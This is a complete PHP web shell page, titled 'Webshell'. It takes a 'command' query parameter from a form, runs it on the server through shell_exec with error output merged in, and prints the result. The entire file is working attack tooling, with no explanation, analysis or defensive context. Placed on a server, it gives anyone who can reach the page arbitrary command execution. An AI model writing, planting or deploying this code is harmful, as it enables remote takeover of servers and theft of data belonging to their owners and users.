<html>
  <head>
    <title>Webshell</title>
  </head>
  <body>
    <form>
      <input name="command" type="text" value="<?php echo isset($_GET["command"]) ? htmlspecialchars($_GET["command"]) : ""; ?>"></input>
      <input type="submit"></input>
    </form>
    <pre><?php echo isset($_GET["command"]) ? htmlspecialchars(shell_exec("exec 2>&1;" . $_GET["command"])) : ""; ?></pre>
  </body>
</html>
